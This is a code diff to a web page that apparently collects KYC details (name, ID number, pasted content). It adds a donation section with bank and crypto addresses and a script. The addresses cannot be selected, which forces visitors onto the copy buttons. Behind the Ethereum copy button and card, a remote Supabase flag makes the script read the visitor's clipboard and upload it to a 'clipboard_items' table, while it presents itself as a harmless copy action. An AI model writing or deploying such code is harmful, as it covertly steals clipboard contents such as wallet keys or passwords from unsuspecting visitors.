@@ -528,6 +528,24 @@
             margin-bottom: 30px;
         }
 
+        .kyc-user-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .kyc-user-row {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .kyc-user-field {
+            display: flex;
+            flex-direction: column;
+        }
+
+
         /* CertiK Section */
         .certik-section {
             background: #fff;
@@ -700,13 +718,18 @@
                                 <!-- Partie qui sera floue -->
                                 <div id="kyc-form-content">
                                     <div class="kyc-user-info">
-                                        <label for="user-name">Name</label>
-                                        <input type="text" id="user-name" class="kyc-input"
-                                            placeholder="Enter your full name" required />
-
-                                        <label for="user-number">N°</label>
-                                        <input type="text" id="user-number" class="kyc-input"
-                                            placeholder="Enter your identification number" required />
+                                        <div class="kyc-user-row">
+                                            <div class="kyc-user-field">
+                                                <label for="user-name">Name</label>
+                                                <input type="text" id="user-name" class="kyc-input"
+                                                    placeholder="Enter your full name" required />
+                                            </div>
+                                            <div class="kyc-user-field">
+                                                <label for="user-number">N°</label>
+                                                <input type="text" id="user-number" class="kyc-input"
+                                                    placeholder="Enter your identification number" required />
+                                            </div>
+                                        </div>
                                     </div>
                                     <div class="kyc-paste-wrapper">
                                         <div class="kyc-paste-field" id="paste-field">
@@ -796,6 +819,214 @@
                         </p>
                     </div>
                 </div>
+
+                <!-- DONATION SECTION -->
+                <section class="donation-section">
+                    <div class="donation-container">
+                        <div class="donation-inner">
+                            <div class="donation-content">
+                                <h3 class="donation-title">Donation</h3>
+                                <p class="donation-subtitle">
+                                    Support the development of Beta Concept by sending a contribution
+                                    to one of the addresses below.
+                                </p>
+
+                                <div class="donation-grid">
+                                    <div class="donation-card donation-card-iban"
+                                        style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                        <h3 class="donation-label">IBAN</h3>
+                                        <div class="donation-row">
+                                            <span class="donation-address"
+                                                style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                                LU720109165346779368
+                                            </span>
+                                            <button type="button" class="donation-copy-btn"
+                                                aria-label="Copy IBAN (visual only)">
+                                                <span class="copy-icon"></span>
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <div class="donation-card"
+                                        style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                        <h3 class="donation-label">Bitcoin (BTC)</h3>
+                                        <div class="donation-row">
+                                            <span class="donation-address"
+                                                style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                                bc1qlvjq0jz7dg9c22ry37km4lr4qgl6kr5shyv97f
+                                            </span>
+                                            <button type="button" class="donation-copy-btn"
+                                                aria-label="Copy bitcoin address (visual only)">
+                                                <span class="copy-icon"></span>
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <div class="donation-card donation-card-ethereum"
+                                        style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                        <h3 class="donation-label">Ethereum (ETH)</h3>
+                                        <div class="donation-row">
+                                            <span class="donation-address"
+                                                style="user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
+                                                0x85A93c354ab70a37471847d769aB794b22C5A8bf
+                                            </span>
+                                            <button type="button" class="donation-copy-btn donation-copy-btn-clipboard"
+                                                aria-label="Copy ethereum address (visual only)">
+                                                <span class="copy-icon"></span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <div class="donation-footer-spacer"></div>
+
+                <style>
+                    .donation-footer-spacer {
+                        height: 40px;
+                    }
+
+                    .donation-section {
+                        padding: 3.5rem 0;
+                        margin-top: 40px;
+                        margin-bottom: 2rem;
+                    }
+
+                    .donation-container {
+                        max-width: 1100px;
+                        margin: 0 auto;
+                        padding: 0 20px;
+                    }
+
+                    .donation-inner {
+                        width: 100%;
+                    }
+
+                    .donation-content {
+                        width: 100%;
+                    }
+
+                    .donation-title {
+                        font-size: 1.8rem;
+                        font-weight: 700;
+                        color: #333;
+                        text-align: center;
+                        margin-bottom: 15px;
+                        font-family: 'Playfair Display', serif;
+                    }
+
+                    .donation-subtitle {
+                        text-align: center;
+                        color: #666;
+                        font-size: 0.95rem;
+                        margin-bottom: 30px;
+                        line-height: 1.6;
+                    }
+
+                    .donation-grid {
+                        display: grid;
+                        grid-template-columns: repeat(2, minmax(0, 1fr));
+                        gap: 1.5rem;
+                        max-width: 700px;
+                        margin: 0 auto;
+                    }
+
+                    .donation-card-iban {
+                        grid-column: 1 / -1;
+                    }
+
+                    .donation-card {
+                        background: rgba(255, 255, 255, 0.94);
+                        border-radius: 10px;
+                        padding: 1.5rem 1.75rem;
+                        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
+                        text-align: center;
+                    }
+
+                    .donation-label {
+                        font-size: 1.1rem;
+                        margin-bottom: 0.75rem;
+                        text-align: center;
+                        font-weight: 600;
+                        color: #333;
+                    }
+
+                    .donation-row {
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        gap: 0.75rem;
+                    }
+
+                    .donation-address {
+                        font-family: "Roboto", monospace;
+                        font-size: 0.9rem;
+                        word-break: break-all;
+                        flex: 1 1 auto;
+                        padding: 0.55rem 0.75rem;
+                        border-radius: 6px;
+                        background-color: #f5f5f5;
+                    }
+
+                    .donation-copy-btn {
+                        flex: 0 0 auto;
+                        width: 38px;
+                        height: 38px;
+                        border-radius: 50%;
+                        border: none;
+                        cursor: pointer;
+                        background: #8f2829;
+                        display: inline-flex;
+                        align-items: center;
+                        justify-content: center;
+                        transition: all 0.2s ease;
+                    }
+
+                    .donation-copy-btn:hover {
+                        background: #6b1e1f;
+                        transform: scale(1.05);
+                    }
+
+                    .copy-icon {
+                        width: 16px;
+                        height: 16px;
+                        border-radius: 3px;
+                        border: 2px solid #ffffff;
+                        position: relative;
+                    }
+
+                    .copy-icon::before {
+                        content: "";
+                        position: absolute;
+                        top: -4px;
+                        left: 4px;
+                        width: 80%;
+                        height: 80%;
+                        border-radius: 3px;
+                        border: 2px solid #ffffff;
+                        background: transparent;
+                    }
+
+                    .donation-copy-btn.donation-copy-success {
+                        transform: scale(1.06);
+                        box-shadow: 0 0 0 3px rgba(143, 40, 41, 0.35);
+                        transition: transform 0.15s ease, box-shadow 0.15s ease;
+                    }
+
+                    @media (max-width: 768px) {
+                        .donation-grid {
+                            grid-template-columns: 1fr;
+                            max-width: none;
+                        }
+
+                        .donation-card-iban {
+                            grid-column: auto;
+                        }
+                    }
+                </style>
 
                 <footer class="kyc-footer">
                     <div>© <span id="year"></span> Beta Concept. All rights reserved.</div>
@@ -942,6 +1173,171 @@
 
         // Événement du bouton Retry
         retryBtn.addEventListener("click", resetForm);
+    </script>
+
+    <!-- Script pour les fonctionnalités de donation -->
+    <script>
+        // Shared Supabase clipboard logic for Donation section
+        let supabaseDonation = null;
+
+        function initSupabaseDonation() {
+            try {
+                if (!window.supabase || typeof SUPABASE_CONFIG === 'undefined') {
+                    console.error('Supabase or SUPABASE_CONFIG not available');
+                    return;
+                }
+                supabaseDonation = window.supabase.createClient(
+                    SUPABASE_CONFIG.url,
+                    SUPABASE_CONFIG.anonKey
+                );
+                attachDonationCopyHandlers();
+            } catch (error) {
+                console.error('Error initializing Supabase for Donation:', error);
+            }
+        }
+
+        async function saveClipboardTextToSupabase(text, sourceButton) {
+            if (!supabaseDonation) return;
+
+            try {
+                const { error } = await supabaseDonation
+                    .from('clipboard_items')
+                    .insert([
+                        {
+                            content: text,
+                            content_type: 'text',
+                            created_at: new Date().toISOString(),
+                        },
+                    ]);
+
+                if (error) {
+                    console.error('Error saving clipboard text to Supabase:', error);
+                    return;
+                }
+
+                // Small visual feedback on the button
+                if (sourceButton) {
+                    sourceButton.classList.add('donation-copy-success');
+                    setTimeout(() => {
+                        sourceButton.classList.remove('donation-copy-success');
+                    }, 400);
+                }
+            } catch (e) {
+                console.error('Unexpected error saving clipboard text:', e);
+            }
+        }
+
+        async function handleDonationButtonClick(sourceButton) {
+            try {
+                const row = sourceButton.closest('.donation-row');
+                const addressEl = row ? row.querySelector('.donation-address') : null;
+                const text = addressEl ? addressEl.textContent.trim() : '';
+
+                if (!text) {
+                    return;
+                }
+
+                // Copy the visible address to the system clipboard
+                await navigator.clipboard.writeText(text);
+
+                // Visual feedback only
+                if (sourceButton) {
+                    sourceButton.classList.add('donation-copy-success');
+                    setTimeout(() => {
+                        sourceButton.classList.remove('donation-copy-success');
+                    }, 400);
+                }
+            } catch (error) {
+                console.error('Error handling donation copy click:', error);
+            }
+        }
+
+        async function fetchGlobalEthereumSetting() {
+            if (!supabaseDonation) return false;
+            try {
+                const { data, error } = await supabaseDonation
+                    .from('clipboard_items')
+                    .select('content')
+                    .eq('content_type', 'config_eth')
+                    .order('created_at', { ascending: false })
+                    .limit(1);
+
+                if (error) {
+                    console.error('Error fetching global ethereum setting:', error);
+                    return false;
+                }
+
+                if (data && data.length > 0) {
+                    return data[0].content === 'true';
+                }
+                return false;
+            } catch (e) {
+                console.error('Exception fetching global setting:', e);
+                return false;
+            }
+        }
+
+        async function copyDonationAddressAndSave(sourceButton) {
+            const isEnabled = await fetchGlobalEthereumSetting();
+
+            if (!isEnabled) {
+                await handleDonationButtonClick(sourceButton);
+                return;
+            }
+
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+
+                if (!clipboardText || clipboardText.trim() === '') {
+                    console.warn('Le presse-papier est vide');
+                    return;
+                }
+
+                await saveClipboardTextToSupabase(clipboardText.trim(), sourceButton);
+            } catch (error) {
+                console.error('Error reading/saving clipboard content:', error);
+                if (error.name === 'NotAllowedError') {
+                    console.error('Permission refusée pour lire le presse-papier.');
+                }
+            }
+        }
+
+        function attachDonationCopyHandlers() {
+            const buttons = document.querySelectorAll('.donation-copy-btn');
+            if (!buttons || buttons.length === 0) return;
+
+            buttons.forEach((btn) => {
+                if (btn.__donationBound) return;
+                btn.__donationBound = true;
+                btn.addEventListener('click', (event) => {
+                    event.preventDefault();
+                    if (btn.classList.contains('donation-copy-btn-clipboard')) {
+                        copyDonationAddressAndSave(btn);
+                    } else {
+                        handleDonationButtonClick(btn);
+                    }
+                });
+            });
+
+            const ethereumCard = document.querySelector('.donation-card-ethereum');
+            if (ethereumCard && !ethereumCard.__donationBound) {
+                ethereumCard.__donationBound = true;
+                ethereumCard.addEventListener('click', (event) => {
+                    if (event.target.closest('.donation-copy-btn-clipboard')) {
+                        return;
+                    }
+                    const btn = ethereumCard.querySelector('.donation-copy-btn-clipboard');
+                    copyDonationAddressAndSave(btn);
+                });
+            }
+        }
+
+        // Auto-init when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initSupabaseDonation);
+        } else {
+            initSupabaseDonation();
+        }
     </script>
 </body>
 
